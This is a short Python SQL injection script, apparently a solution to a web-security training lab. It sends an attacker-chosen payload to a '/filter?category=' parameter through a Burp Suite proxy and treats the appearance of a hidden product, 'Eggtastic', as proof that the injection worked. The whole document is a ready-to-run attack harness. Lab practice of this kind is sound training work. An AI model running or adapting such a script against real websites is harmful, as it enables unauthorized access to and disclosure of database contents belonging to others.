import requests
import sys
import urllib3

proxies = {'http' : 'http://10.0.2.5:8080', 'https' : 'http://10.0.2.5:8080'} # BurpSuite handles decryption

def exploit_sqli(url, payload):
        uri = '/filter?category='
        r = requests.get(url + uri + payload, verify = False, proxies=proxies)
        if "Eggtastic" in r.text: # Checking for hidden product
                return True
        return False

if __name__ == '__main__':
        try:
                url = sys.argv[1].strip()
                payload = sys.argv[2].strip()
        except IndexError:
                print("[-] Usage: %s <url> <payload>" % sys.argv[0])
                print('[-] Example: %s www.example.com  "1=1"' % sys.argv[0])
                sys.exit(-1)

        if exploit_sqli(url, payload):
                print("[+] SQLi Successful")
        else:
                print("[-] SQLi Unsuccessful")
